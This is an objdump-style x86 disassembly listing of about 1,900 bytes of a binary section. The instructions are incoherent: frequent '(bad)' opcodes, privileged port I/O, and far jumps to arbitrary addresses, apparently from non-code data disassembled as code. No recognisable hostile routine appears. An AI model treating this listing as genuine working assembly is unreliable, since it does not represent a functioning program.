  41d878:	test   al,0xd5
  41d87a:	mov    dh,0xbf
  41d87c:	(bad)  
  41d87d:	retf   0x8eeb
  41d880:	add    BYTE PTR [edi],0xfd
  41d883:	in     eax,0xc3
  41d885:	(bad)
  41d888:	push   0x74
  41d88a:	push   ss
  41d88b:	mov    dl,0x29
  41d88d:	sbb    eax,0x34c825c6
  41d892:	sub    DWORD PTR [ebp+0x324bfbee],ebx
  41d898:	cs fwait
  41d89a:	sub    al,0x2b
  41d89c:	dec    esi
  41d89d:	(bad)  
  41d89e:	stc    
  41d89f:	cmp    esp,edx
  41d8a1:	aam    0x16
  41d8a3:	cmp    BYTE PTR [edi-0x1b1a7339],ch
  41d8a9:	fimul  DWORD PTR [esi]
  41d8ab:	jle    0x41d8dd
  41d8ad:	nop
  41d8ae:	push   edi
  41d8af:	xchg   BYTE PTR [ebp+edi*1-0x4d374d79],bh
  41d8b6:	pop    ebx
  41d8b7:	inc    edi
  41d8b8:	call   0xba9f763f
  41d8bd:	ss xchg ecx,eax
  41d8bf:	mov    bl,0x4c
  41d8c1:	mov    edi,0x83b6b253
  41d8c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8c7:	pop    es
  41d8c8:	pusha  
  41d8c9:	into   
  41d8ca:	mov    eax,ds:0x2bf18e10
  41d8cf:	jno    0x41d8a1
  41d8d1:	mov    esi,DWORD PTR [ebx+0x6c]
  41d8d4:	mov    dh,0xfe
  41d8d6:	cdq    
  41d8d7:	mov    sp,0x55ba
  41d8db:	ins    DWORD PTR es:[edi],dx
  41d8dc:	jbe    0x41d929
  41d8de:	test   eax,0x85789bb1
  41d8e3:	xor    al,0xa8
  41d8e5:	fst    QWORD PTR [ecx]
  41d8e7:	xor    BYTE PTR [ebp-0x54],al
  41d8ea:	mov    es,WORD PTR [esi+ebp*4+0x4bbd66b5]
  41d8f1:	and    DWORD PTR [esi+ebp*1],ebx
  41d8f4:	pop    ss
  41d8f5:	jnp    0x41d94e
  41d8f7:	stos   BYTE PTR es:[edi],al
  41d8f8:	mov    esi,0xfc695160
  41d8fd:	(bad)  
  41d8fe:	cli    
  41d8ff:	daa    
  41d900:	iret   
  41d901:	inc    DWORD PTR [ecx+0x374dbb6a]
  41d907:	cld    
  41d908:	add    esp,DWORD PTR [eax+ebp*4-0x55]
  41d90c:	loope  0x41d91e
  41d90e:	stos   DWORD PTR es:[edi],eax
  41d90f:	fwait
  41d910:	out    0x4f,al
  41d912:	push   ebp
  41d913:	cmp    DWORD PTR [eax+ebx*8-0x3ef19ec2],0x895e8edb
  41d91e:	dec    edx
  41d91f:	push   eax
  41d920:	jmp    0x9006dba5
  41d925:	inc    esi
  41d926:	and    ebp,DWORD PTR ds:0xdb3e728c
  41d92c:	push   esi
  41d92d:	ror    esp,cl
  41d92f:	and    DWORD PTR [edi+0x64],eax
  41d932:	adc    edi,DWORD PTR [eax+0x2f4487cf]
  41d938:	clc    
  41d939:	jmp    0x41d917
  41d93b:	fs test dh,ah
  41d93e:	jb     0x41d945
  41d940:	shl    DWORD PTR [eax],cl
  41d942:	mov    DWORD PTR [eax+0x3089f9f9],ebx
  41d948:	js     0x41d98d
  41d94a:	cs jne 0x41d986
  41d94d:	and    DWORD PTR [esi],eax
  41d94f:	jmp    0x93d90750
  41d954:	retf   
  41d955:	lods   eax,DWORD PTR ds:[esi]
  41d956:	mov    ecx,?
  41d958:	das    
  41d959:	inc    ebp
  41d95a:	mov    al,0x86
  41d95c:	test   al,0xaa
  41d95e:	fld    TBYTE PTR [ecx]
  41d960:	fst    QWORD PTR ds:0x8b462f74
  41d966:	adc    al,0xd8
  41d968:	aam    0x21
  41d96a:	xor    eax,0x7ceb146f
  41d96f:	mov    edi,0x7ea68ed0
  41d974:	retf   
  41d975:	add    BYTE PTR [eax+0x4b7cc876],cl
  41d97b:	push   ds
  41d97c:	cmp    al,0xb0
  41d97e:	and    BYTE PTR [edx+0x458a0dc2],0x8c
  41d985:	mov    ah,0x14
  41d987:	rol    eax,cl
  41d989:	inc    ecx
  41d98a:	pop    eax
  41d98b:	or     al,0x56
  41d98d:	sahf   
  41d98e:	fdivr  QWORD PTR [ebp-0x8]
  41d991:	shl    BYTE PTR [edi],cl
  41d993:	pop    esp
  41d994:	push   ss
  41d995:	sti    
  41d996:	in     al,dx
  41d997:	cmp    al,0x20
  41d99a:	push   ebx
  41d99b:	add    ebp,edx
  41d99d:	and    dh,BYTE PTR ds:0x9ac2dca5
  41d9a3:	call   0x2e8e:0xebcd3f91
  41d9aa:	sbb    BYTE PTR [esp+ebx*4-0x7c5b12da],dh
  41d9b1:	call   0xd83c67d9
  41d9b6:	cmp    esp,DWORD PTR [edi]
  41d9b8:	pushf  
  41d9b9:	and    BYTE PTR [eax-0x70],ah
  41d9bc:	push   ebp
  41d9bd:	nop
  41d9be:	pusha  
  41d9bf:	test   eax,0x3bdcd7f2
  41d9c4:	pop    eax
  41d9c5:	ins    DWORD PTR es:[edi],dx
  41d9c6:	std    
  41d9c7:	cmp    al,0x2
  41d9c9:	lea    esp,[ecx-0x1bb6666a]
  41d9cf:	out    0x0,al
  41d9d1:	sbb    al,0xdb
  41d9d3:	das    
  41d9d4:	mov    ebx,0x9c978bee
  41d9d9:	mov    esp,0xcdb4ac20
  41d9de:	lds    ebx,FWORD PTR [edi]
  41d9e0:	idiv   BYTE PTR [eax+0x28]
  41d9e3:	xchg   esp,eax
  41d9e4:	xchg   ebx,eax
  41d9e5:	cwde   
  41d9e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9e7:	fistp  WORD PTR [esi]
  41d9e9:	mov    esp,0x2c992c89
  41d9ee:	adc    esp,DWORD PTR [esi-0x32]
  41d9f1:	lock cmp BYTE PTR es:[edi+0x7f],bh
  41d9f6:	ret    0x4650
  41d9f9:	jns    0x41da52
  41d9fb:	push   esp
  41d9fc:	and    al,0xa7
  41d9fe:	sub    eax,0xe489a7f3
  41da03:	mov    dl,0x88
  41da05:	or     ecx,DWORD PTR [edx-0x48]
  41da08:	and    al,0xe7
  41da0a:	jne    0x41d9d5
  41da0c:	mov    eax,ds:0x7c7a84aa
  41da11:	fimul  DWORD PTR [ecx+0x6e7920b3]
  41da17:	xchg   esi,eax
  41da18:	fdivr  DWORD PTR [ecx-0x1f523114]
  41da1e:	xchg   ebp,eax
  41da1f:	fldcw  WORD PTR [eax+0x34]
  41da22:	mov    BYTE PTR [ecx+0x42ef07f9],dl
  41da28:	repz and cl,BYTE PTR ds:0xc14cf206
  41da2f:	fcomp  QWORD PTR [ecx]
  41da31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da32:	adc    al,0x3f
  41da34:	pop    ebx
  41da35:	fstp   st(0)
  41da37:	call   0xe550:0x36ac47c5
  41da3e:	repnz mov cs,WORD PTR [esi]
  41da41:	mov    ebp,0xa6daa9b7
  41da46:	jg     0x41da3b
  41da48:	or     eax,0x53a2c85c
  41da4d:	sbb    BYTE PTR [eax],0xef
  41da50:	stos   DWORD PTR es:[edi],eax
  41da51:	pop    ecx
  41da52:	mov    bl,0x1a
  41da54:	pop    es
  41da55:	push   ebx
  41da56:	(bad)  
  41da57:	adc    DWORD PTR [edi-0x5],0xeff8c750
  41da5e:	push   ss
  41da5f:	in     al,dx
  41da60:	ins    BYTE PTR es:[edi],dx
  41da61:	ja     0x41da22
  41da63:	pop    es
  41da64:	sbb    esp,DWORD PTR [ebx]
  41da66:	sub    DWORD PTR [edx-0x1d],edi
  41da69:	outs   dx,DWORD PTR ds:[esi]
  41da6a:	stos   DWORD PTR es:[edi],eax
  41da6b:	push   cs
  41da6c:	aad    0x6a
  41da6e:	clc    
  41da6f:	jno    0x41dac5
  41da71:	add    cl,BYTE PTR [ecx-0x29b4f97e]
  41da77:	gs std 
  41da79:	lods   al,BYTE PTR ds:[esi]
  41da7a:	or     eax,0xe8c6962
  41da7f:	and    BYTE PTR [ebx+0xba004fb],bl
  41da85:	inc    edi
  41da86:	(bad)  
  41da87:	loop   0x41da46
  41da89:	fnstenv gs:[edx]
  41da8c:	in     al,0x43
  41da8e:	sbb    DWORD PTR [edi+0x0],ebx
  41da91:	ror    DWORD PTR [edi+edx*4+0x5b],cl
  41da95:	outs   dx,DWORD PTR ds:[esi]
  41da96:	retf   
  41da97:	xor    al,0xc4
  41da99:	push   ebx
  41da9a:	and    BYTE PTR [esi+eax*1+0x4a],al
  41da9e:	(bad)  
  41da9f:	push   ebx
  41daa0:	xchg   ecx,eax
  41daa1:	(bad)  
  41daa2:	fisub  WORD PTR [edi-0x410f4068]
  41daa8:	cmp    dl,BYTE PTR [edi]
  41daaa:	xor    DWORD PTR [ecx-0x5a],edx
  41daad:	out    0xcd,eax
  41daaf:	push   edi
  41dab0:	in     al,0x7
  41dab2:	mov    bl,0x84
  41dab4:	cs and esp,edx
  41dab7:	pop    ebx
  41dab8:	adc    bh,BYTE PTR [edi+0xa]
  41dabb:	push   cs
  41dabc:	inc    edi
  41dabd:	xchg   ebx,eax
  41dabe:	repz sub eax,0x4c03bf39
  41dac4:	cmp    BYTE PTR [ebp+0x8],dh
  41dac7:	and    al,0x22
  41dac9:	jbe    0x41daba
  41dacb:	call   0x35dea949
  41dad0:	xchg   ebx,eax
  41dad1:	cmp    BYTE PTR [ebp-0x41],dh
  41dad4:	fwait
  41dad5:	push   0xffffff8d
  41dad7:	(bad)  
  41dad8:	aam    0x9a
  41dada:	push   0x77
  41dadc:	jp     0x41daca
  41dade:	push   ecx
  41dadf:	(bad)  
  41dae0:	es mov edi,0x363c3afe
  41dae6:	cwde   
  41dae7:	xor    eax,0xfe519519
  41daec:	jnp    0x41db51
  41daee:	sti    
  41daef:	daa    
  41daf0:	mov    gs,WORD PTR [ecx]
  41daf2:	std    
  41daf3:	jecxz  0x41da82
  41daf5:	xchg   esp,eax
  41daf6:	pop    ds
  41daf7:	mov    al,es:0x334a5765
  41dafd:	jmp    0xc55a:0xbf8fac61
  41db04:	mov    esp,0xbd68a0d8
  41db09:	mov    eax,ds:0xaecab0a9
  41db0e:	inc    esp
  41db0f:	pop    esp
  41db10:	out    dx,al
  41db11:	push   0xffffff95
  41db13:	stos   BYTE PTR es:[edi],al
  41db14:	mov    edi,0x95ce2a91
  41db19:	xchg   esp,eax
  41db1a:	std    
  41db1b:	ins    BYTE PTR es:[edi],dx
  41db1c:	push   ds
  41db1d:	rol    DWORD PTR [eax],0xb9
  41db20:	adc    al,0x41
  41db22:	jl     0x41db43
  41db24:	xchg   edi,eax
  41db25:	xor    eax,0xc821086f
  41db2a:	fs (bad) 
  41db2c:	mov    ebp,0xe1b53a9f
  41db31:	das    
  41db32:	icebp  
  41db33:	jecxz  0x41db55
  41db35:	dec    eax
  41db36:	std    
  41db37:	jp     0x41db11
  41db39:	sub    al,0x8d
  41db3b:	out    0xf0,eax
  41db3d:	inc    edi
  41db3e:	inc    esi
  41db3f:	loope  0x41db74
  41db41:	jp     0x41db6d
  41db43:	xchg   cl,cl
  41db45:	xchg   ebp,eax
  41db46:	in     eax,0x38
  41db48:	stc    
  41db49:	ror    BYTE PTR [eax+edx*1+0x5e39d933],0xdf
  41db51:	dec    edx
  41db52:	and    esp,esp
  41db54:	mov    edi,0x1a0b53e5
  41db59:	imul   DWORD PTR [eiz*1-0x3e18f345]
  41db60:	popa   
  41db61:	mov    bl,0x9e
  41db63:	retf   
  41db64:	leave  
  41db65:	xor    al,0xa9
  41db67:	xchg   ebx,eax
  41db68:	push   ecx
  41db69:	mul    ebp
  41db6b:	inc    edi
  41db6c:	sub    eax,0x45fff38c
  41db71:	cmc    
  41db72:	push   ecx
  41db73:	out    0xa7,al
  41db75:	jecxz  0x41db36
  41db77:	mov    eax,0x1f47a75b
  41db7c:	iret   
  41db7d:	push   eax
  41db7e:	mov    ah,0xa2
  41db80:	jo     0x41dbde
  41db82:	and    eax,0x7fa7e632
  41db87:	jmp    0x1179:0x3ba497aa
  41db8e:	sub    eax,0xcb022943
  41db93:	cmc    
  41db94:	xor    dl,ch
  41db96:	fmul   QWORD PTR ds:0x3dcd26c9
  41db9c:	arpl   WORD PTR [edi-0x7864c011],dx
  41dba2:	xchg   ebp,eax
  41dba3:	scas   eax,DWORD PTR es:[edi]
  41dba4:	xchg   edi,eax
  41dba5:	xor    DWORD PTR [esi+edi*1],ebx
  41dba8:	sub    bl,BYTE PTR [edx]
  41dbaa:	in     al,dx
  41dbab:	das    
  41dbac:	jbe    0x41dbad
  41dbae:	jp     0x41dc1e
  41dbb0:	mov    ds:0x75f1038f,eax
  41dbb5:	pop    ebp
  41dbb6:	dec    ebx
  41dbb7:	dec    ebx
  41dbb8:	(bad)  
  41dbb9:	push   edx
  41dbba:	pushf  
  41dbbb:	out    0x2f,eax
  41dbbd:	and    BYTE PTR [edx+0x2baa63b2],al
  41dbc3:	cli    
  41dbc4:	adc    cl,BYTE PTR [ecx+0xab9ee30]
  41dbca:	ins    DWORD PTR es:[edi],dx
  41dbcb:	jbe    0x41dc04
  41dbcd:	fnstenv [ebp+0x4a]
  41dbd0:	rol    BYTE PTR [edx+0x35],0x6
  41dbd4:	adc    ecx,edx
  41dbd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbd7:	fild   WORD PTR [edi+0x6c4b5e37]
  41dbdd:	and    eax,0x19880d62
  41dbe2:	inc    edx
  41dbe3:	pand   mm6,QWORD PTR [eax-0x27]
  41dbe7:	or     bh,BYTE PTR [edx+0x6b]
  41dbea:	mov    ch,0x91
  41dbec:	or     al,0x81
  41dbee:	loopne 0x41dc18
  41dbf0:	ja     0x41dc36
  41dbf2:	jmp    0x667ebe7a
  41dbf7:	out    dx,al
  41dbf8:	mov    ah,0xfc
  41dbfa:	repz pop ebx
  41dbfc:	inc    ebp
  41dbfd:	scas   eax,DWORD PTR es:[edi]
  41dbfe:	fwait
  41dbff:	sbb    bl,BYTE PTR [ebp+0x74]
  41dc02:	gs ds retf 0x4d21
  41dc07:	add    ebp,DWORD PTR [esi+0x7d]
  41dc0a:	xchg   esp,eax
  41dc0b:	adc    al,0x8c
  41dc0d:	lock xchg ebx,eax
  41dc0f:	dec    edx
  41dc10:	mov    dl,0xd6
  41dc12:	pop    eax
  41dc13:	sub    al,0x5a
  41dc15:	mov    dh,ah
  41dc17:	rcl    BYTE PTR [eax+0x9895a32],1
  41dc1d:	dec    esi
  41dc1e:	inc    ebx
  41dc1f:	mov    edi,0x3a9f17d
  41dc24:	div    BYTE PTR [ebx-0x2677cf5a]
  41dc2a:	xchg   ebp,eax
  41dc2b:	aaa    
  41dc2c:	mov    BYTE PTR [eax-0x59470dbc],ch
  41dc32:	xchg   esp,eax
  41dc33:	mov    eax,ds:0x39186202
  41dc38:	jo     0x41dcb0
  41dc3a:	fldl2e 
  41dc3c:	mov    edx,0x92a49c74
  41dc41:	cs in  eax,dx
  41dc43:	(bad)  
  41dc44:	(bad)  
  41dc45:	ds push edx
  41dc47:	add    ebx,ecx
  41dc49:	je     0x41dc89
  41dc4b:	outs   dx,DWORD PTR ds:[esi]
  41dc4c:	ret    0x2dc8
  41dc4f:	xchg   DWORD PTR [ecx+0x774ebd2b],ecx
  41dc55:	mov    DWORD PTR [esi-0x4b653e99],ecx
  41dc5b:	inc    eax
  41dc5c:	jmp    0x8baf:0xf4f56b33
  41dc63:	mov    al,0x3f
  41dc65:	mov    bh,BYTE PTR [ebp-0x67ecbc79]
  41dc6b:	test   BYTE PTR [edi],cl
  41dc6d:	out    0x5b,al
  41dc6f:	mov    dh,0xf2
  41dc71:	int3   
  41dc72:	daa    
  41dc73:	fisubr WORD PTR [esi-0x2b]
  41dc76:	cmp    BYTE PTR [esi+0x34],bl
  41dc79:	dec    ebp
  41dc7a:	sbb    esi,DWORD PTR [ebx+0x11]
  41dc7d:	cdq    
  41dc7e:	and    ebp,0xfffffff7
  41dc81:	or     eax,0x4ce439cc
  41dc86:	ins    DWORD PTR es:[edi],dx
  41dc87:	cmc    
  41dc88:	jmp    0x41dc2f
  41dc8a:	test   al,0xff
  41dc8c:	test   al,0x9b
  41dc8e:	ins    BYTE PTR es:[edi],dx
  41dc8f:	(bad)  
  41dc90:	cmp    cl,BYTE PTR [edi+0x13a01824]
  41dc96:	lea    edx,[ebp-0x294486a1]
  41dc9c:	cmp    esi,DWORD PTR [edx+0x450b4717]
  41dca2:	push   eax
  41dca3:	lods   eax,DWORD PTR ds:[esi]
  41dca4:	repz mov dl,BYTE PTR [edx+0x29]
  41dca8:	adc    edi,edi
  41dcaa:	push   0x63
  41dcac:	das    
  41dcad:	retf   0x51be
  41dcb0:	and    ch,bh
  41dcb2:	xchg   edx,eax
  41dcb3:	gs jno 0x41dd16
  41dcb6:	pop    eax
  41dcb7:	(bad)  
  41dcb8:	and    DWORD PTR [ebx],esp
  41dcba:	fsubr  DWORD PTR [edx+0x47d58388]
  41dcc0:	not    DWORD PTR ds:0x71b085a2
  41dcc6:	add    ebp,ebp
  41dcc8:	(bad)  
  41dcc9:	in     eax,0xab
  41dccb:	add    al,0x96
  41dccd:	retf   
  41dcce:	pop    es
  41dccf:	mov    ch,ch
  41dcd1:	jnp    0x41dd10
  41dcd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcd4:	in     al,dx
  41dcd5:	or     DWORD PTR [edx],esp
  41dcd7:	imul   edi,edx,0x59
  41dcda:	daa    
  41dcdb:	jo     0x41dcec
  41dcdd:	out    dx,al
  41dcde:	in     eax,dx
  41dcdf:	out    0xa6,eax
  41dce1:	lea    esi,[edx]
  41dce3:	cdq    
  41dce4:	(bad)  
  41dce6:	sahf   
  41dce7:	outs   dx,DWORD PTR ds:[esi]
  41dce8:	retf   
  41dce9:	sbb    bh,bl
  41dceb:	pop    ecx
  41dcec:	pop    ecx
  41dced:	out    0xa5,al
  41dcef:	(bad)  [esi-0x35]
  41dcf2:	inc    eax
  41dcf3:	lahf   
  41dcf4:	and    dh,ah
  41dcf6:	or     al,0x3
  41dcf8:	mov    al,BYTE PTR [eax+0xcfc8d92]
  41dcfe:	jns    0x41dd39
  41dd00:	xor    BYTE PTR [esp+eax*1+0x1d],bh
  41dd04:	leave  
  41dd05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd07:	cmp    edi,eax
  41dd09:	dec    esp
  41dd0a:	test   DWORD PTR [eax+ecx*2-0x5487531],ebp
  41dd11:	gs shr ah,cl
  41dd14:	das    
  41dd15:	dec    eax
  41dd16:	(bad)  
  41dd17:	aam    0x7e
  41dd19:	sbb    eax,0xa09db120
  41dd1e:	and    esp,edx
  41dd20:	lahf   
  41dd21:	call   0x32a:0xc69b6ec4
  41dd28:	loop   0x41dda5
  41dd2a:	(bad)  
  41dd2b:	mov    al,0x9f
  41dd2d:	sti    
  41dd2e:	repnz stos DWORD PTR es:[edi],eax
  41dd30:	idiv   BYTE PTR [eax]
  41dd32:	repnz mov ds:0x3637a19c,eax
  41dd38:	inc    esp
  41dd39:	scas   al,BYTE PTR es:[edi]
  41dd3a:	add    BYTE PTR [edx+0x1b736ab0],cl
  41dd40:	inc    ebp
  41dd41:	sbb    eax,DWORD PTR [eax+0x630ad0b7]
  41dd47:	arpl   WORD PTR [ecx-0x7],dx
  41dd4a:	and    al,0xed
  41dd4c:	mov    edx,esp
  41dd4e:	cmp    ecx,DWORD PTR [eax]
  41dd50:	ret    0xec24
  41dd53:	adc    eax,0x46bc7d0f
  41dd58:	ldmxcsr DWORD PTR [eax]
  41dd5b:	gs dec ebx
  41dd5d:	fdivr  DWORD PTR [ecx-0x42]
  41dd60:	imul   BYTE PTR [edx-0x7492e7f6]
  41dd66:	jb     0x41ddc9
  41dd68:	dec    edi
  41dd69:	js     0x41dd28
  41dd6b:	cmp    eax,0x7933226
  41dd70:	int3   
  41dd71:	dec    eax
  41dd72:	fistp  WORD PTR [esi+0x4d147bd2]
  41dd78:	jmp    0x722763e3
  41dd7d:	out    dx,eax
  41dd7e:	xchg   edi,eax
  41dd7f:	sbb    BYTE PTR [ebx],bl
  41dd81:	std    
  41dd82:	out    0xe,eax
  41dd84:	call   DWORD PTR [esi+0x72d67f1b]
  41dd8a:	xchg   ebx,eax
  41dd8b:	or     eax,0x1461f925
  41dd90:	adc    BYTE PTR [ebx],dh
  41dd92:	pop    es
  41dd93:	js     0x41dd6e
  41dd95:	sub    BYTE PTR [esi],0x11
  41dd98:	fistp  DWORD PTR [edx-0x240d6a32]
  41dd9e:	ret    0x2dd2
  41dda1:	pop    esi
  41dda2:	hlt    
  41dda3:	lods   al,BYTE PTR ds:[esi]
  41dda4:	out    dx,al
  41dda5:	xchg   DWORD PTR [esi+0x54ba887c],ebx
  41ddab:	sti    
  41ddac:	adc    edi,ebx
  41ddae:	inc    esi
  41ddaf:	push   ds
  41ddb0:	mov    dh,0xe7
  41ddb2:	sub    DWORD PTR [eax],edx
  41ddb4:	lods   al,BYTE PTR ds:[esi]
  41ddb5:	xor    al,0x2b
  41ddb7:	xchg   esi,eax
  41ddb8:	pop    edx
  41ddb9:	(bad)  
  41ddba:	in     eax,0xb0
  41ddbc:	mov    ebx,0xaaa71d1a
  41ddc1:	mov    ds:0xdb2aff3c,al
  41ddc6:	leave  
  41ddc7:	or     al,0x0
  41ddc9:	mov    ds:0xd470e8d5,al
  41ddce:	ins    BYTE PTR es:[edi],dx
  41ddcf:	fbld   TBYTE PTR [eiz*8-0x372f514f]
  41ddd6:	pop    ebp
  41ddd7:	add    al,BYTE PTR [ebx-0x104d9a45]
  41dddd:	mov    cl,0x3
  41dddf:	ja     0x41dd75
  41dde1:	jp     0x41dd83
  41dde3:	pop    esp
  41dde4:	aad    0x48
  41dde6:	pop    esi
  41dde7:	push   eax
  41dde8:	add    ebx,DWORD PTR [esi-0x7e77e10a]
  41ddee:	fwait
  41ddef:	adc    cl,BYTE PTR [edx-0x1ffb928d]
  41ddf5:	clc    
  41ddf6:	lahf   
  41ddf7:	push   esi
  41ddf8:	adc    ah,BYTE PTR [esp+ebp*4]
  41ddfb:	mov    dh,0x34
  41ddfd:	sti    
  41ddfe:	jp     0x41dde9
  41de00:	pop    edx
  41de01:	aaa    
  41de02:	or     BYTE PTR [ecx],0x16
  41de05:	mov    ah,0xdb
  41de07:	dec    eax
  41de08:	(bad)  
  41de09:	xchg   ebx,eax
  41de0a:	jmp    0x68d:0x9a5504ae
  41de11:	mov    eax,0x3fcd863b
  41de16:	out    dx,eax
  41de17:	scas   al,BYTE PTR es:[edi]
  41de18:	inc    esp
  41de19:	addr16 mov ebx,0xe10fdba
  41de1f:	sbb    edx,DWORD PTR [ebx-0x60]
  41de22:	mov    ebp,0x9f5870c2
  41de27:	(bad)  
  41de28:	call   0xf0b3:0xad4207a
  41de2f:	retf   
  41de30:	xor    eax,0xd950d40f
  41de35:	aas    
  41de36:	out    0xe7,eax
  41de38:	out    dx,al
  41de39:	ins    DWORD PTR es:[edi],dx
  41de3a:	xor    BYTE PTR [ebx-0x7096207],al
  41de40:	gs cwde 
  41de42:	pop    ecx
  41de43:	xchg   ecx,eax
  41de44:	repz mov ebx,0xc02d73f2
  41de4a:	icebp  
  41de4b:	into   
  41de4c:	(bad)  
  41de4d:	leave  
  41de4e:	jnp    0x41dde8
  41de50:	lods   eax,DWORD PTR ds:[esi]
  41de51:	jmp    0xad27aaae
  41de56:	hlt    
  41de57:	fidivr WORD PTR [ebx+0x71fd3362]
  41de5d:	inc    ecx
  41de5e:	mov    ebx,0x4eaa14f0
  41de63:	leave  
  41de64:	jl     0x41de1f
  41de66:	imul   edx,DWORD PTR [edx+edx*8+0x2d89b0bb],0xfffffffd
  41de6e:	je     0x41dec3
  41de70:	or     al,0xe0
  41de72:	loope  0x41de65
  41de74:	popf   
  41de75:	dec    ebp
  41de76:	int    0x4d
  41de78:	and    esi,DWORD PTR [ebx]
  41de7a:	and    eax,DWORD PTR [edx+0x551d248f]
  41de80:	clc    
  41de81:	xchg   ebp,eax
  41de82:	ror    DWORD PTR [esi+0x46],0x6c
  41de86:	jmp    0xe661:0xb2adfe9
  41de8d:	jmp    0xa05d:0x96fa72c4
  41de94:	inc    eax
  41de95:	xchg   esp,eax
  41de96:	adc    esi,ecx
  41de98:	(bad)  
  41de99:	xchg   edx,eax
  41de9a:	stos   DWORD PTR es:[edi],eax
  41de9b:	dec    eax
  41de9c:	cdq    
  41de9d:	or     BYTE PTR [ebx-0x3a4a1dad],ch
  41dea3:	idiv   edi
  41dea5:	push   cs
  41dea6:	aad    0x52
  41dea8:	mov    al,ss:0x6245fdfc
  41deae:	sar    esp,0x7a
  41deb1:	sahf   
  41deb2:	js     0x41de50
  41deb4:	push   cs
  41deb5:	jae    0x41de56
  41deb7:	gs iret 
  41deb9:	and    dl,BYTE PTR [edi]
  41debb:	into   
  41debc:	mov    edi,es
  41debe:	push   ds
  41debf:	cmp    dl,BYTE PTR [ecx+eax*1]
  41dec2:	dec    esp
  41dec3:	push   esp
  41dec4:	not    DWORD PTR [ecx]
  41dec6:	into   
  41dec7:	adc    DWORD PTR [ebp-0x70],ebp
  41deca:	add    al,0xcd
  41decc:	pop    ss
  41decd:	xor    edi,DWORD PTR [eax-0x3b4dec18]
  41ded3:	aaa    
  41ded4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded5:	add    bl,0x84
  41ded8:	retf   
  41ded9:	outs   dx,DWORD PTR ds:[esi]
  41deda:	push   esp
  41dedb:	in     eax,0x79
  41dedd:	(bad)  
  41dede:	call   FWORD PTR [edi+eiz*2+0x78]
  41dee2:	mov    ah,0xe6
  41dee4:	mov    esp,0xc8d72f4b
  41dee9:	call   0x6d78d738
  41deee:	clc    
  41deef:	xor    cl,bl
  41def1:	cmp    BYTE PTR [edi],0x11
  41def4:	test   BYTE PTR [eax],bl
  41def6:	sub    ah,BYTE PTR [ecx-0x15978d58]
  41defc:	dec    edx
  41defd:	(bad)  
  41defe:	xchg   ebx,eax
  41deff:	scas   eax,DWORD PTR es:[edi]
  41df00:	mov    ebx,0xe2e503b
  41df05:	adc    DWORD PTR [ecx],0xfffffff9
  41df08:	test   al,0x69
  41df0a:	jno    0x41df4a
  41df0c:	lods   al,BYTE PTR ds:[esi]
  41df0d:	xor    DWORD PTR [edx-0x59],ebp
  41df10:	aas    
  41df11:	lahf   
  41df12:	mov    bh,0xa5
  41df14:	inc    ebp
  41df15:	xchg   DWORD PTR [edx],esi
  41df17:	outs   dx,DWORD PTR ds:[esi]
  41df18:	push   edi
  41df19:	pusha  
  41df1a:	mov    edx,0xd14d9da0
  41df1f:	mov    edx,0x6319bf1d
  41df24:	add    dl,0x0
  41df27:	clc    
  41df28:	pop    ecx
  41df29:	popf   
  41df2a:	xchg   ebp,eax
  41df2b:	nop
  41df2c:	xchg   ebp,eax
  41df2d:	in     eax,0x2
  41df2f:	ret    0x44
  41df32:	shl    DWORD PTR ds:0x90d10cd3,1
  41df38:	aaa    
  41df39:	rcl    BYTE PTR ds:[ecx],1
  41df3c:	inc    edi
  41df3d:	inc    esi
  41df3e:	inc    edi
  41df3f:	adc    dh,ah
  41df41:	dec    ecx
  41df42:	push   esp
  41df43:	sahf   
  41df44:	outs   dx,DWORD PTR ds:[esi]
  41df45:	pop    ds
  41df46:	jecxz  0x41dfa1
  41df48:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41df4a:	or     ch,BYTE PTR [edx]
  41df4c:	jo     0x41df7d
  41df4e:	xchg   edx,eax
  41df4f:	aas    
  41df50:	cs leave 
  41df52:	inc    edi
  41df53:	fsub   QWORD PTR [ebx+0x1e]
  41df56:	jmp    0x41dfb3
  41df58:	pop    ss
  41df59:	and    eax,esp
  41df5b:	xchg   edx,eax
  41df5c:	mov    ds:0x25e0deb,al
  41df61:	xchg   edi,eax
  41df62:	cmp    eax,0xf57c9ae1
  41df67:	push   0xcdfa9c20
  41df6c:	jae    0x41df31
  41df6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df6f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41df71:	dec    edx
  41df72:	mov    al,0x63
  41df74:	nop
  41df75:	add    DWORD PTR [eax*8-0x6b3914f3],ecx
  41df7c:	in     al,dx
  41df7d:	pop    esi
  41df7e:	sti    
  41df7f:	lods   al,BYTE PTR ds:[esi]
  41df80:	es cld 
  41df82:	cmp    al,0x7d
  41df84:	xor    eax,0x5b
  41df87:	add    eax,0xf4f1df7d
  41df8c:	aaa    
  41df8d:	sti    
  41df8e:	xchg   ebx,eax
  41df8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df90:	arpl   WORD PTR [ecx-0x31],si
  41df93:	ror    DWORD PTR [ebx-0x5aa0011a],0x52
  41df9a:	or     bl,ah
  41df9c:	ins    DWORD PTR es:[edi],dx
  41df9d:	mov    bh,0x27
  41df9f:	mov    fs,WORD PTR [ecx]
  41dfa1:	adc    ah,BYTE PTR [esi-0x7e625b]
  41dfa7:	cwde   
  41dfa8:	inc    esi
  41dfa9:	arpl   WORD PTR [ebx],cx
  41dfab:	xor    ch,BYTE PTR [edi+0x575d193]
  41dfb1:	dec    ecx
  41dfb2:	xor    ch,BYTE PTR [eax]
  41dfb4:	adc    al,ah
  41dfb6:	push   es
  41dfb7:	jp     0x41df47
  41dfb9:	(bad)  
  41dfba:	lock pop es
  41dfbc:	push   ecx
  41dfbd:	add    al,0xdc
  41dfbf:	aaa    
  41dfc0:	dec    esi
  41dfc1:	out    0xb3,eax
  41dfc3:	fwait
  41dfc4:	aam    0x7a
  41dfc6:	sbb    DWORD PTR [edi+0x36d63d0d],0x96fd8250
  41dfd0:	jae    0x41e01a
